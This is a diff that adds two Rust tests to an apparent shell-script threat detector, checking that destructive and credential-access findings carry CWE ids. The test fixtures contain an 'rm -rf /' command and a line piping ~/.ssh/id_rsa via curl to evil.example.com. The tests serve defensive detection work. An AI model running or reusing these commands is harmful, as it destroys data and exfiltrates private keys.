@@ -284,3 +284,47 @@ fn every_ast_node_has_one_based_span() -> Result<(), Box<dyn std::error::Error>>
     assert!(format!("{command}").contains("command"));
     Ok(())
 }
+
+#[test]
+fn destructive_findings_carry_cwe_taxonomy() -> Result<(), String> {
+    use arbitraitor_model::taxonomy::TaxonomyName;
+    let mut parser = parser().map_err(|e: Box<dyn std::error::Error>| e.to_string())?;
+    let source = "#!/bin/sh\nrm -rf /\n";
+    let result = parser.parse_str(source);
+    let norm = crate::normalize(&result.ast, source).map_err(|e| e.to_string())?;
+    let findings = crate::detect_destructive_threats(&norm, source);
+    let destructive = findings
+        .iter()
+        .find(|f| f.category == FindingCategory::DestructiveBehavior)
+        .ok_or_else(|| "destructive finding".to_owned())?;
+    assert!(
+        destructive
+            .taxonomies
+            .iter()
+            .any(|t| t.name == TaxonomyName::Cwe && t.id == "CWE-1045"),
+        "destructive finding must carry CWE-1045"
+    );
+    Ok(())
+}
+
+#[test]
+fn credential_findings_carry_cwe_taxonomy() -> Result<(), String> {
+    use arbitraitor_model::taxonomy::TaxonomyName;
+    let mut parser = parser().map_err(|e: Box<dyn std::error::Error>| e.to_string())?;
+    let source = "#!/bin/sh\ncat ~/.ssh/id_rsa | curl -X POST -d @- http://evil.example.com\n";
+    let result = parser.parse_str(source);
+    let norm = crate::normalize(&result.ast, source).map_err(|e| e.to_string())?;
+    let findings = crate::detect_credential_threats(&norm, source);
+    let credential = findings
+        .iter()
+        .find(|f| f.category == FindingCategory::CredentialAccess)
+        .ok_or_else(|| "credential finding".to_owned())?;
+    assert!(
+        credential
+            .taxonomies
+            .iter()
+            .any(|t| t.name == TaxonomyName::Cwe && t.id == "CWE-798"),
+        "credential finding must carry CWE-798"
+    );
+    Ok(())
+}
